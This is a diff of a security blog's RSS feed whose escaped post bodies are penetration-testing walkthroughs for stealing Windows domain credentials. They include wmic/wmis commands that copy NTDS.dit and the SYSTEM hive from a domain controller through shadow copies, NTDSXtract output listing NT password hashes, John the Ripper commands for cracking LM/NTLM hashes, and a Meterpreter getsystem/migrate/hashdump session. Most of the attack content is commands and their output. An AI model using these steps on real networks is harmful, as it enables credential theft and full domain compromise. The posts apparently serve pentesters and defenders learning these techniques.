+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	John Doe:$NT$88e4d9fabaecf3ded18dd80905511b29:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3797&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           Random User
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: randy@projectmentor.net
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    randy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 2701eb29-628a-4568-a093-d33a7db10d04
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-1108
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2013-04-08 02:34:04
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-05-27 16:06:07
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-04-19 06:59:25.423280
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-04-08 02:34:10.482690
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-04-08 02:34:10.482690
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users Random User 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Random User:$NT$88ead9fa5aecf3dec18dd80905521b29:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All done. Start crackin&#39;&lt;/p&gt;
 </description>
     </item>
     
@@ -293,12 +292,12 @@ root@wpad:~/blog/NTDSXtract 1.0#
 &lt;/blockquote&gt;
 &lt;p&gt;Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
 &lt;p&gt;First authenticate to the domain controller and make sure you have a good working directory to use.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
 dir \\DC1\C$
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&amp;rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;
 &lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&amp;rsquo;s DB much like Window&amp;rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
 &lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&amp;rsquo;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&amp;rsquo;t work very nicely in a Meterpreter shell:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:\tempoutput.txt&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:\tempoutput.txt&amp;#34;
 Executing (Win32_Process)-&amp;gt;Create()
 Method execution successful.
 Out Parameters:
@@ -317,7 +316,7 @@ instance of __PARAMETERS
 &lt;li&gt;&lt;code&gt;2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&lt;/code&gt; - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &amp;gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Process starts and then you need to view the output file by either copying it down, &lt;code&gt;type \DC1\C$\TEMP\output.txt&lt;/code&gt; or mount the C drive as a network share. Either way you should either see something like this:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2005 Microsoft Corp.
 
@@ -328,24 +327,24 @@ Contents of shadow copy set ID: {671090fd-0198}
          Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
          Originating Machine: wpad
          Service Machine: wpad
-         Provider: &#39;Microsoft Software Shadow Copy provider 1.0&#39;
+         Provider: &amp;#39;Microsoft Software Shadow Copy provider 1.0&amp;#39;
          Type: ClientAccessibleWriters
          Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;or&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2005 Microsoft Corp.
 
 No items found that satisfy the query
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&amp;rsquo;t have to remember this):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&amp;rsquo;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
 &lt;p&gt;Next we just copy the files out of the shadow copies. First the SYSTEM hive:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then the NTDS.dit (notice this one isn&amp;rsquo;t in System32):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt
 NTSTATUS: NT_STATUS_OK - Success
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Copy those files to your own system for offline extraction which I&amp;rsquo;ll cover in part 2.&lt;/p&gt;
 </description>
@@ -361,7 +360,7 @@ NTSTATUS: NT_STATUS_OK - Success
 &lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
 &lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
 &lt;p&gt;To do that is very simple:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;{print length, $0}&amp;#39; rockyou.txt | sort -n | cut -d &amp;#34; &amp;#34; -f2- &amp;gt; rockyou_ls.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
 </description>
     </item>
@@ -398,14 +397,14 @@ NTSTATUS: NT_STATUS_OK - Success
 &lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/2&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/2&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;The result is as follows:&lt;/p&gt;
 &lt;p&gt;Given this hash:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398:::
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398:::
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don&amp;rsquo;t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_lm2ntlm_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;cracked the LM side in 16 seconds. Now you don&amp;rsquo;t need to use John to get the LM side (rainbow tables work better at times),&lt;/p&gt;
 &lt;p&gt;Solar Designer (JtR&amp;rsquo;s main dev) suggested the following path:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_lm2ntlm_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;A bit hard to read but here are the commands:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;./john -show pwdump.txt | cut -d: -f2 &amp;gt; cracked      
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./john -show pwdump.txt | cut -d: -f2 &amp;gt; cracked      
 ./john -w=cracked -rules:nt -format=nt pwdump.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see (if you squint) that works well. Rich Rumble suggested:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/3&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/3&lt;/a&gt;&lt;/p&gt;
@@ -455,7 +454,7 @@ NTSTATUS: NT_STATUS_OK - Success
       
       <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
       <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;                ##                          ###           ##    ##
  ##  ##  #### ###### ####  #####   #####    ##    ####        ######
 ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
 ####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
@@ -549,7 +548,7 @@ Current pid: 2992
 meterpreter &amp;gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
 ============================================================
 Enabled Process Privileges
 ============================================================
@@ -577,24 +576,24 @@ Enabled Process Privileges
 meterpreter &amp;gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
 ...got system (via technique 1).
 
 meterpreter &amp;gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
 [*] Migrating to 1720...
 [*] Migration completed successfully.
 
 meterpreter &amp;gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
 meterpreter &amp;gt; hashdump 
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
 [*] Migrating to 1288...
 [*] Migration completed successfully.
 
